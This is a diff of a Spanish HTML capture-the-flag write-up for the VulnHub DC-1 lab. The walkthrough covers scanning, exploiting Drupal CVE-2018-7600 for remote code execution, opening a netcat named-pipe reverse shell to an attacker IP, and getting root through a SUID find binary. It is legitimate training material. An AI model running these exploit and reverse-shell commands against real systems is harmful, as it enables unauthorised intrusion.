@@ -93,7 +93,7 @@
   <header class="mb-4">
     <h1 class="f1 lh-condensed mb-2">WriteUp: DC-1 | VulnHub</h1><div class="d-flex flex-items-center color-fg-muted f5 mb-3"><time datetime="2026-03-16T00:00:00Z">
         2026-03-16
-      </time><span class="mx-2">&middot;</span><span>12 min read</span><span class="mx-2">&middot;</span><span>MaxisFront</span></div><div class="d-flex flex-wrap mb-3" style="gap: 0.5rem;"><a href="/es/tags/linux/" class="topic-tag">Linux</a><a href="/es/tags/drupal/" class="topic-tag">Drupal</a><a href="/es/tags/cms/" class="topic-tag">CMS</a><a href="/es/tags/cve-2018-7600/" class="topic-tag">CVE-2018-7600</a><a href="/es/tags/suid/" class="topic-tag">SUID</a><a href="/es/tags/gftobins/" class="topic-tag">GFTOBins</a></div><img src="/posts/writeup-dc-1-vulnhub/Drupal_Logo.png" alt="WriteUp: DC-1 | VulnHub" loading="lazy" class="rounded-2 width-full mb-3" style="max-height: 400px; object-fit: cover;"></header>
+      </time><span class="mx-2">&middot;</span><span>12 min read</span><span class="mx-2">&middot;</span><span>MaxisFront</span></div><div class="d-flex flex-wrap mb-3" style="gap: 0.5rem;"><a href="/es/tags/linux/" class="topic-tag">Linux</a><a href="/es/tags/web/" class="topic-tag">Web</a><a href="/es/tags/drupal/" class="topic-tag">Drupal</a><a href="/es/tags/cms/" class="topic-tag">CMS</a><a href="/es/tags/cve-2018-7600/" class="topic-tag">CVE-2018-7600</a><a href="/es/tags/suid/" class="topic-tag">SUID</a><a href="/es/tags/gftobins/" class="topic-tag">GFTOBins</a></div><img src="/posts/writeup-dc-1-vulnhub/Drupal_Logo.png" alt="WriteUp: DC-1 | VulnHub" loading="lazy" class="rounded-2 width-full mb-3" style="max-height: 400px; object-fit: cover;"></header>
 
   <div class="markdown-body">
     <blockquote>
@@ -146,7 +146,7 @@
 <li><code>-l</code>: Descubrimiento de dispositivos en nuestra subred local (&ndash;localnet).</li>
 </ul>
 </blockquote>
-<img src="./images/20260306192120.png" alt="Identifying the IP" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260306192120.png" alt="Identifying the IP" loading="lazy">
 <p>La dirección IP de interés es la <code>192.168.1.169</code>. Realizamos una prueba de conectividad a través de <code>ping</code> para verificar que es posible entablar una conexión entre la máquina objetivo y la nuestra.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>ping -c1 192.168.1.169 -R</span></span></code></pre></div><blockquote>
 <ul>
@@ -155,7 +155,7 @@
 <li><code>-R</code>: Solicitamos que se trace la ruta del paquete para observar si hay conexión directa o el paquete pasa por nodos durante el proceso (Los cuales pueden reducir el valor del TTL).</li>
 </ul>
 </blockquote>
-<img src="./images/20260306195718.png" alt="Testing the connection with the victim" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260306195718.png" alt="Testing the connection with the victim" loading="lazy">
 <p>Podemos observar que la ruta de nuestra traza ICMP indica una conexión exitosa. Por otro lado, un valor del TTL cercano a  <code>64</code> suele implicar que nos enfrentamos a un OS <code>Linux/Unix</code> (Aunque esto no es una identificación definitiva).</p>
 <hr>
 <h3 id="reconocimiento-de-puertos">Reconocimiento de Puertos</h3>
@@ -176,15 +176,15 @@
 En entornos empresariales se desaconseja una enumeración agresiva, puesto que enviar paquetes <code>tcp, icmp y/o udp</code> en grandes cantidades (<code>5000</code>, por ejemplo) puede provocar que sistemas de monitorización identifiquen el escaneo rápidamente  y nos bloqueen.</p>
 <p>Por otro lado, si los sistemas no soportan la recepción de grandes cantidades de paquetes, estos podrían saturar los sistemas temporalmente o el mismo escaneo podría dar falsos positivos/negativos.</p>
 </blockquote>
-<img src="./images/20260307102017.png" alt="Nmap Scan" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260307102017.png" alt="Nmap Scan" loading="lazy">
 <h3 id="enumeración-de-puertos">Enumeración de Puertos</h3>
 <p>Observamos los puertos <code>22 (ssh), 80 (http), 111 (rpcbind) y el 57182 (Desconocido actualmente)</code>. Ahora, podemos centrar la enumeración en estos puertos utilizando la flag <code>-sV</code>, donde <code>Nmap</code> - tras haber entablado una comunicación con un puerto - analice las respuestas para determinar la versión del servicio que hay detrás.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -sV -p22,80,111,57182 -oN ports-enumeration 192.168.1.169</span></span></code></pre></div><img src="./images/20260307103608.png" alt="First port enumeration with -sV flag" loading="lazy">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -sV -p22,80,111,57182 -oN ports-enumeration 192.168.1.169</span></span></code></pre></div><img src="/posts/writeup-dc-1-vulnhub/images/20260307103608.png" alt="First port enumeration with -sV flag" loading="lazy">
 <p>El resultado del escaneo ahora nos expone el apartado <code>VERSION</code>. A pesar de contener datos valiosos, es posible mejorar la calidad de estos a través de la flag <code>-sC</code>, gracias a la cual <code>Nmap</code> utilizará un conjunto predeterminado de <code>scripts de reconocimiento</code> para recabar aún más información:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,111,57182 -sCV -oN ports-enumeration 192.168.1.169</span></span></code></pre></div><blockquote>
 <p>Es posible concatenar las flags <code>-sV y -sC</code>, resultando en <code>-sCV</code>.</p>
 </blockquote>
-<img src="./images/20260307103859.png" alt="Second port enumeration with -sCV flag" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260307103859.png" alt="Second port enumeration with -sCV flag" loading="lazy">
 <p>Tras un análisis de la enumeración de puertos, podemos agrupar los resultados en la siguiente tabla:</p>
 <table>
   <thead>
@@ -244,12 +244,12 @@ En entornos empresariales se desaconseja una enumeración agresiva, puesto que e
 </blockquote>
 <h3 id="enumeración-web">Enumeración Web</h3>
 <p>En el puerto 80 se está ejecutando un servicio <code>http</code>, el cual tras visitarlo nos indica que - como ya se ha comentado - hace uso del CMS &ldquo;<code>Drupal 7</code>&rdquo;:</p>
-<img src="./images/20260307120546.png" alt="Home of the Drupal 7 web page" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260307120546.png" alt="Home of the Drupal 7 web page" loading="lazy">
 <blockquote>
 <p>En entornos de pentesting web es buena idea probar credenciales comunes, tales como <code>admin:admin</code> o <code>user:password</code>. Esto suele ser frecuente en sistemas antiguos y con mantenimiento irregular.</p>
 </blockquote>
 <p>A pesar de que el sistema web sea antiguo, no posee credenciales comunes.  A pesar de ello, hay otro campo de interés: <code>Create new account</code>:</p>
-<img src="./images/20260307121144.png" alt="Identifying the admin account" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260307121144.png" alt="Identifying the admin account" loading="lazy">
 <p>Observamos que <code>Drupal 7</code> nos indica que &ldquo;<code>The name admin is already taken</code>&rdquo;. Esto nos podría ser de utilidad para probar nuevamente claves comunes, pero no es el caso. Por lo tanto, seguiremos con la enumeración de la página web.</p>
 <p>Una dirección de gran valor suele ser <code>/robots.txt</code>, puesto que le indica a los <code>web crawlers y spiders</code> de los buscadores evitar indexar determinadas urls en sus resultados; al buscar dentro de este observamos direcciones como <code>/admin</code>, pero sucede lo mismo que en el anterior intento. <em>Acceso denegado</em>.</p>
 <p>Tras observar que no hay más puntos de los cuales obtener información, podemos pasar al análisis de la vulnerabilidad de <code>Drupal 7</code>.</p>
@@ -258,7 +258,7 @@ En entornos empresariales se desaconseja una enumeración agresiva, puesto que e
 <p>El anterior punto nos puede dar paso al siguiente razonamiento: Conforme pasan los años,  se suelen descubrir vulnerabilidades críticas en versiones de sistemas reconocidos (Como un <code>Drupal</code>).</p>
 <p>Por lo tanto, al ser <em><code>Drupal 7</code></em> una versión antigua, probablemente tenga algún número importante de vulnerabilidades.</p>
 <p>Una búsqueda rápida en Google nos arroja lo siguiente:</p>
-<img src="./images/20260307122506.png" alt="Gathering information about the SA-Core-2018-002 Vulnerability" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260307122506.png" alt="Gathering information about the SA-Core-2018-002 Vulnerability" loading="lazy">
 <p><a href="https://www.drupal.org/sa-core-2018-002">Drupal - SA-Core-2018-002</a></p>
 <blockquote>
 <p>Es común que diversas vulnerabilidades tengan alguna PoC (<code>Proof of Concept</code>) por Internet, o inclusive exploits hechos por la comunidad para su uso en entornos controlados.</p>
@@ -273,7 +273,7 @@ En entornos empresariales se desaconseja una enumeración agresiva, puesto que e
 <p>Créditos al usuario <code>pimps</code> (<a href="https://github.com/pimps">Perfil de GitHub</a>)</p>
 </blockquote>
 <p>Tras haber descargado el exploit, podemos ejecutar la siguiente línea de comandos para aplicar un <code>RCE</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>python3 drupa7-CVE-2018-7600.py -c <span style="color:#f1fa8c">&#39;whoami&#39;</span> http://192.168.1.169/</span></span></code></pre></div><img src="./images/20260307134239.png" alt="Using the CVE-2018-7600 python exploit to get access" loading="lazy">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>python3 drupa7-CVE-2018-7600.py -c <span style="color:#f1fa8c">&#39;whoami&#39;</span> http://192.168.1.169/</span></span></code></pre></div><img src="/posts/writeup-dc-1-vulnhub/images/20260307134239.png" alt="Using the CVE-2018-7600 python exploit to get access" loading="lazy">
 <p>De esta manera comprobamos que tenemos capacidad de ejecución de código remoto. Por lo tanto, para eficientar el proceso de explotación y escalada de privilegios, entablaremos una reverse shell:</p>
 <h3 id="creación-de-una-reverse-shell">Creación de una Reverse Shell</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>&gt; Máquina Atacante
@@ -289,7 +289,7 @@ En entornos empresariales se desaconseja una enumeración agresiva, puesto que e
 En equipos actuales, la flag <code>-e</code> no está disponible por razones de seguridad.</p>
 <p>A pesar de ello, es posible entablar una reverse shell a través de <code>Named Pipes</code>: <code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc $IP 4444 &gt; /tmp/f</code>.</p>
 </blockquote>
-<img src="./images/20260307135039.png" alt="Listing the /var/www/hmtl content" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260307135039.png" alt="Listing the /var/www/hmtl content" loading="lazy">
 <p>Listamos el contenido del directorio actual de trabajo. ¡Perfecto! Solo hay un pequeño detalle: Nuestra reverse shell no es interactiva. Comandos como <code>CTRL + C</code> nos cerrarán la consola, por decir un ejemplo.</p>
 <p>Por ello, modificamos la tty para que sea completamente interactiva.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash <span style="color:#6272a4"># Presionamos CTRL + Z después de esto</span>
@@ -305,7 +305,7 @@ En equipos actuales, la flag <code>-e</code> no está disponible por razones de 
 </ul>
 </blockquote>
 <p>Ahora ya tenemos una <code>shell completamente interactiva</code>:</p>
-<img src="./images/20260307135813.png" alt="Interactive Reverse Shell established" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260307135813.png" alt="Interactive Reverse Shell established" loading="lazy">
 <h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
 <p>Para realizar la escalada de privilegios, podemos buscar binarios con permisos SUID, los cuales son comúnmente asignados para ejecutar binarios con permisos de administrador sin necesidad de que el usuario esté en el grupo sudoers.</p>
 <p>Una manera de buscarlos, es la siguiente:</p>
@@ -318,10 +318,10 @@ En equipos actuales, la flag <code>-e</code> no está disponible por razones de 
 <li><code>2&gt;/dev/null</code>: Redigirimos los errores a /dev/null para ocultarlos y solo enfocarnos en las respuestas válidas.</li>
 </ul>
 </blockquote>
-<img src="./images/20260307141326.png" alt="Identifying the find binary with the SUID bit" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260307141326.png" alt="Identifying the find binary with the SUID bit" loading="lazy">
 <h3 id="aprovechamiento-del-suid-de-find">Aprovechamiento del SUID de Find</h3>
 <p>Dentro de todas las respuestas, es posible observar un SUID crítico: <code>/usr/bin/find</code>. Si buscamos en GFTOBins, vemos un comando crucial:</p>
-<img src="./images/20260307142638.png" alt="Using GFTOBins to get root privileges" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260307142638.png" alt="Using GFTOBins to get root privileges" loading="lazy">
 <p>El <code>SUID</code> del binario <code>find</code> nos permite <code>ejecutar el intérprete de comandos (sh)</code> a través del siguiente comando:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>find . -exec /bin/sh <span style="color:#f1fa8c">\;</span> -quit</span></span></code></pre></div><blockquote>
 <ul>
@@ -333,7 +333,7 @@ En equipos actuales, la flag <code>-e</code> no está disponible por razones de 
 <blockquote>
 <p>Es relevante destacar que el bit <code>SUID</code> en el comando <code>find</code> permite ejecutar los comandos posteriores (Como /bin/sh) con los privilegios del dueño del archivo, es decir, <em><code>root</code></em>.</p>
 </blockquote>
-<img src="./images/20260307141718.png" alt="Finally getting root privileges" loading="lazy">
+<img src="/posts/writeup-dc-1-vulnhub/images/20260307141718.png" alt="Finally getting root privileges" loading="lazy">
 <p>Tenemos permisos de administrador! Para la última comprobación, podemos intentar leer la flag que se encuentra en el directorio <code>/root</code>:</p>
 <blockquote>
 <p>Well done!!!!</p>
@@ -581,6 +581,9 @@ by contacting me via Twitter - @DCAU7</p>
           <div class="Layout-sidebar"><aside><div class="color-bg-subtle rounded-2 p-3 mb-3">
   <h3 class="h5 mb-2">Recent Posts</h3>
   <ul class="list-style-none"><li class="mb-2">
+      <a href="/es/posts/writeup-conversor-htb/" class="Link--primary">WriteUp: Conversor | HTB</a><span class="color-fg-muted f6 d-block">
+        2026-05-24
+      </span></li><li class="mb-2">
       <a href="/es/posts/writeup-dc-2-vulnhub/" class="Link--primary">WriteUp: DC-2 | VulnHub</a><span class="color-fg-muted f6 d-block">
         2026-03-25
       </span></li><li class="mb-2">
@@ -624,16 +627,24 @@ by contacting me via Twitter - @DCAU7</p>
       cms
     </a><a href="/es/tags/cve-2018-7600/" class="topic-tag">
       cve-2018-7600
+    </a><a href="/es/tags/cve-2024-48990/" class="topic-tag">
+      cve-2024-48990
     </a><a href="/es/tags/drupal/" class="topic-tag">
       drupal
     </a><a href="/es/tags/gftobins/" class="topic-tag">
       gftobins
     </a><a href="/es/tags/git/" class="topic-tag">
       git
+    </a><a href="/es/tags/gtfobins/" class="topic-tag">
+      gtfobins
     </a><a href="/es/tags/linux/" class="topic-tag">
       linux
+    </a><a href="/es/tags/path-traversal/" class="topic-tag">
+      path-traversal
     </a><a href="/es/tags/suid/" class="topic-tag">
       suid
+    </a><a href="/es/tags/web/" class="topic-tag">
+      web
     </a><a href="/es/tags/wordpress/" class="topic-tag">
       wordpress
     </a></div>
